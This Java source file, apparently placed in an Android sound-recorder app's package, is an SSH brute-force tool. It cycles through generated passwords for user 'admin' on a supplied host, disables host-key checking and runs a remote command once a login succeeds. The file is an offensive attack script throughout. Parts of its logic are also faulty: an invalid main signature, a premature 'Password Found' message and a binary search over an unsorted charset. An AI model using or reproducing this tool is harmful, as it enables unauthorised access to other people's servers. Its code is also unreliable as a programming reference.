package com.danielkim.soundrecorder.fragments;

import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

import java.io.ByteArrayOutputStream;
import java.util.Arrays;

public class BruteForce
{


    public static void main(String args,String host)
    {
        String password = "omhh";
        char[] charset = "abcdefghijklmnopqrstuvwxyz@".toCharArray();
        BruteForce bf = new BruteForce(charset, 1);

        String attempt = bf.toString();
        int n=0;
        while (true)

                if (n == 0) {
                    if(attempt.length()<6) {
                    //  MainActivity vin=new MainActivity();
                    //  Button btn = (Button) vin.findViewById(R.id.ip);
                    //  btn.setEnabled(false);
                    boolean b = false;
                    System.out.println("Password Found: " + attempt);
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    try {
                        JSch jsch = new JSch();
                        Session session = jsch.getSession("admin", host, 22);
                        session.setPassword(attempt);
                        System.out.println(attempt);
                        session.setConfig("StrictHostKeyChecking", "no");
                        session.setTimeout(500);
                        session.connect();
                        ChannelExec channel = (ChannelExec) session.openChannel("exec");
                        channel.setOutputStream(baos);
                        channel.setCommand("ls");
                        channel.connect();
                        Thread.sleep(1000);
                        channel.disconnect();
                        System.out.println("Executed successfully!\nThe output is: " + new String(baos.toByteArray()));
                        //   MainActivity.Result.setText(new String(baos.toByteArray()));
                        b = true;
                        // MainActivity.ipa.setEnabled(true);
                        //return true;
                        n = 1;
                    } catch (JSchException e) {
                        //System.out.println("Error: " + e);
                        attempt = bf.toString();
                        System.out.println("" + attempt);
                        bf.increment();
                        continue;
                    } catch (InterruptedException ee) {
                        // System.out.println("Error: " + ee);
                        attempt = bf.toString();
                        System.out.println("" + attempt);
                        bf.increment();
                        continue;
                    }
                    break;
                }
                    else {
                        n=1;
                    }
            }
    }
    private char[] cs; // Character Set
    private char[] cg; // Current Guess

    public BruteForce(char[] characterSet, int guessLength)
    {
        cs = characterSet;
        cg = new char[guessLength];
        Arrays.fill(cg, cs[0]);
    }

    public void increment()
    {
        int index = cg.length - 1;
        while(index >= 0)
        {
            if (cg[index] == cs[cs.length-1])
            {
                if (index == 0)
                {
                    cg = new char[cg.length+1];
                    Arrays.fill(cg, cs[0]);
                    break;
                }
                else
                {
                    cg[index] = cs[0];
                    index--;
                }
            }
            else
            {
                cg[index] = cs[Arrays.binarySearch(cs, cg[index]) + 1];
                break;
            }
        }
    }

    @Override
    public String toString()
    {
        return String.valueOf(cg);
    }
}
